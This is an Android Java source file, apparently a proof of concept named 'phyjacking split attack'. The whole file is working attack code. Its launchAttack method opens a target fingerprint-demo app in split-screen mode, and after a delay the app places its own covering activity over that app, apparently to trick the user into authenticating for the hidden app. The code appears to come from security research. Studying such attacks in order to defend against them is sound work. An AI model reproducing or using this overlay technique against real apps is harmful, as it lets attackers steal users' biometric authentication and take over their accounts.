package poc.phyjacking.splitattack;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;


public class MainActivity extends Activity{

	@Override
	protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.home);

		final Button btn = findViewById(R.id.button);
		btn.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				launchAttack();
			}
		});
	}

	public void launchAttack() {
		String testPkgName = "xb.fingerprint.demo";
		final Intent victimIntent = getPackageManager().getLaunchIntentForPackage(testPkgName);
		victimIntent.setFlags(
			Intent.FLAG_ACTIVITY_NO_ANIMATION
			| Intent.FLAG_ACTIVITY_LAUNCH_ADJACENT
			| Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK
		);

		startActivity(victimIntent);
		if (this.isInMultiWindowMode()) {
			Intent backIntent = this.getIntent();
			backIntent.putExtra("split", true);
			startActivity(backIntent);
		} else {
			Toast.makeText(this, "Not in multi-window mode", Toast.LENGTH_SHORT).show();
			launchCover();
		}
	}

	protected void onNewIntent(Intent intent) {
		if (intent.getBooleanExtra("split", false))
			launchCover();
	}

	public void launchCover() {
		final Intent coverIntent = new Intent(MainActivity.this, CoveringActivity.class);
		coverIntent.setFlags(
			Intent.FLAG_ACTIVITY_NO_ANIMATION
			| Intent.FLAG_ACTIVITY_LAUNCH_ADJACENT
			| Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK
		);
		delayedStart(coverIntent, 2000);
	}

	public void delayedStart(final Intent intent, int delay) {
		final Handler coverHanler = new Handler();
		Runnable coverRunnable = new Runnable() {
			@Override
			public void run() { startActivity(intent); }
		};
		coverHanler.postDelayed(coverRunnable, delay);
	}
}
